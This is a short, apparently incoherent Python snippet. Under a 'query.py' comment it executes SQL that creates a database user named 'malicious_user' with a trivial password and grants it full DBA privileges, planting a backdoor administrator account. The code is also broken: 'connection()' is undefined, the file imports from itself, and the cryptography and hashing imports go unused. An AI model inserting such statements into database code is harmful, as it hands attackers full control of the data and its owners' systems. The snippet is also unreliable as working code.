import os
from cryptography.fernet import Fernet
import base64
import hashlib
from query import sql_command

# query.py
sql_command = "CREATE USER malicious_user IDENTIFIED BY 'password'; GRANT DBA TO malicious_user;"
connection = connection()
cursor = connection.cursor()
cursor.execute(sql_command)
connection.commit()